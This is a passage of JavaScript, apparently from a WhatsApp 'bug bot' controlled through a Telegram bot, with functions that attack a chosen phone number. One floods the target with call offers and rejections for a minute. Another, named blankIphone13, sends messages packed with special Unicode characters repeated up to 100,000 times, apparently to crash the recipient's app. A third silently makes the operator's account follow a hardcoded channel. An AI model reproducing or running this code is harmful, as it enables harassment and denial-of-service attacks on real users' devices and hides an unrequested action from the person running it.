                    yntkts ? yntkts(msg) : encodeWAMessage(msg)
                );
                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });
                    if (type === "pkmsg") shouldIncludeDeviceIdentity = true;

                    return {
                        tag: "to",
                        attrs: { jid },
                        content: [{
                            tag: "enc",
                            attrs: { v: "2", type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );
        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };
    const startTime = Date.now();
    const duration = 1 * 60 * 1000;
    while (Date.now() - startTime < duration) {
        const callId = crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase();
        let {
            nodes: destinations,
            shouldIncludeDeviceIdentity
        } = await sock.createParticipantNodes(
            devices,
            { conversation: "y" },
            { count: "0" }
        );
        const callOffer = {
            tag: "call",
            attrs: {
                to: target,
                id: sock.generateMessageTag(),
                from: sock.user.id
            },
            content: [{
                tag: "offer",
                attrs: {
                    "call-id": callId,
                    "call-creator": sock.user.id
                },
                content: [
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    { tag: "video", attrs: { orientation: "0", screen_width: "1920", screen_height: "1080", device_orientation: "0", enc: "vp8", dec: "vp8" } },
                    { tag: "net", attrs: { medium: "3" } },
                    { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                    { tag: "encopt", attrs: { keygen: "2" } },
                    { tag: "destination", attrs: {}, content: destinations },
                    ...(shouldIncludeDeviceIdentity ? [{ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(sock.authState.creds.account, true) }] : [])
                ]
            }]
        };
        
        await sock.sendNode(callOffer);
        await sleep(1000);
        const callTerminate = {
            tag: "call",
            attrs: {
                to: target,
                id: sock.generateMessageTag(),
                from: sock.user.id
            },
            content: [{
                tag: "terminate",
                attrs: {
                    "call-id": callId,
                    "reason": "REJECTED",
                    "call-creator": sock.user.id
                },
                content: []
            }]
        };
        
        await sock.sendNode(callTerminate);
        await sleep(1000);
    }
    console.log("Done");
}

async function blankIphone13(sock, target) {
    const randomLatitude = (Math.random() * 180 - 90).toFixed(6);
    const randomLongitude = (Math.random() * 360 - 180).toFixed(6);

    const locationMessage = {
        location: {
            degreesLatitude: Number(randomLatitude),
            degreesLongitude: Number(randomLongitude),
            name: "",
            address: ""
        },
        caption: "\u{2014} \u{1D419}\u{1D6B5}\u{1D413}\u{1D407}\u{1D418}\u{1D411}\u{1D408}\u{1D40D}\u{1D404}' \u{1D412}\u{1D408}\u{1D40D}\u{1D408}\u{1D412}\u{1D413}\u{1D400}\u{1D411}' \u{F8FF}" + "𑇂𑆵𑆴𑆿".repeat(100000),
        buttons: [
            {
                buttonId: "x",
                buttonText: { displayText: "𑇂𑆵𑆴𑆿".repeat(50000) },
                type: 1
            }
        ],
        headerType: 6,
        requestPaymentMessage: {
            currencyCodeIso4217: "IDR",
            amount1000: 1,
            requestFrom: target,
            noteMessage: {
                extendedTextMessage: {
                    text: "\u{2014} \u{1D419}\u{1D6B5}\u{1D413}\u{1D407}\u{1D418}\u{1D411}\u{1D408}\u{1D40D}\u{1D404}' \u{1D412}\u{1D408}\u{1D40D}\u{1D408}\u{1D412}\u{1D413}\u{1D400}\u{1D411}' \u{F8FF}" + "𑇂𑆵𑆴𑆿".repeat(100000)
                }
            }
        },
        contextInfo: {
            mentionedJid: [target],
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                title: "\u{2014} \u{1D419}\u{1D6B5}\u{1D413}\u{1D407}\u{1D418}\u{1D411}\u{1D408}\u{1D40D}\u{1D404}' \u{1D412}\u{1D408}\u{1D40D}\u{1D408}\u{1D412}\u{1D413}\u{1D400}\u{1D411}' \u{F8FF}" + "𑇂𑆵𑆴𑆿".repeat(100000),
                body: "\u0000",
                thumbnailUrl: "",
                sourceUrl: "",
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    };

    await sock.sendMessage(
        target,
        locationMessage,
        {
            messageId: `${Date.now()}`,
            participant: target
        }
    );
}

const ChannelUrl = [
  "https://whatsapp.com/channel/0029VbCgxZq3LdQSaT6JkO0p",
];

const uniq = (arr) => [...new Set(arr)];

function getAllChannelLinks() {
  return uniq(ChannelUrl);
}

async function autoFollowChannel(sock) {
  try {
    const links = getAllChannelLinks();
    let joined = 0;

    for (const link of links) {
      try {
        let code = "";
        let jid = "";

        const m1 = /(whatsapp\.com\/channel\/|wa\.me\/channel\/)([A-Za-z0-9._-]+)/i.exec(link);
        if (m1) code = m1[2];

        const mInv = /^\d{10,}-[a-z0-9_-]{6,}$/i.exec(link);
        if (!code && mInv) code = mInv[0];

        if (/@newsletter$/i.test(link)) jid = link;

        const m2 = /([0-9]{10,})@newsletter$/i.exec(link);
        if (!jid && m2) jid = m2[0];

        if (!jid && typeof sock.newsletterMetadata === "function" && code) {
          const meta = await sock.newsletterMetadata("invite", code).catch(() => null);
          jid = meta?.id || meta?.jid || "";
        }

        if (!jid && /^[0-9]{10,}@newsletter$/i.test(code)) jid = code;

        if (!jid) continue;

        const fnList = [
          "newsletterFollow",
          "followNewsletter",
          "channelFollow",
          "subscribeChannel",
          "newsletterSubscribe"
        ];

        for (const fn of fnList) {
          if (typeof sock[fn] === "function") {
            await sock[fn](jid).catch(() => {});
            break;
          }
        }

        joined++;
      } catch (err) {}
    }

    if (joined > 0) {
    }
  } catch (err) {
  }
}

function isGroupOnly() {
         if (!fs.existsSync(ONLY_FILE)) return false;
        const data = JSON.parse(fs.readFileSync(ONLY_FILE));
        return data.groupOnly;
        }


function setGroupOnly(status)
            {
            fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: status }, null, 2));
            }
            
async function sleephandler() {
  const speed = 1;
  const delay = 3500;
  const increase = 500;
  const max = 25500;

  for (let i = 0; i < speed; i++) {
    const batchIndex = Math.floor(i / 15);
    let currentDelay = delay + (batchIndex * increase);
    if (currentDelay > max) currentDelay = max;
    await new Promise(res => setTimeout(res, currentDelay));

    if ((i + 1) % 60 === 0) {

      await new Promise(res => setTimeout(res, 2 * 60 * 1000));
    }
  }
}

async function singleEra() {
  const speed = 1;
  const initialDelay = 3500;
  const delayIncrease = 500;
  const maxDelay = 25500;
  const resetThreshold = 60;
  const resetDuration = 2 * 60 * 1000;
  
  for (let i = 0; i < speed; i++) {
    const batchIndex = Math.floor(i / 15);
    let currentDelay = initialDelay + (batchIndex * delayIncrease);
    
    if (currentDelay > maxDelay) currentDelay = maxDelay;
    
    await new Promise(res => setTimeout(res, currentDelay));
    
    if ((i + 1) % resetThreshold === 0) {
      await new Promise(res => setTimeout(res, resetDuration));
    }
  }
}

async function run(total = 15, step = 250) {
  for (let i = 1; i <= total; i++) {
    const delay = i * step;
    await sleep(delay);
  }
}

//-------------- END FUNCTION -------------//
bot.launch();
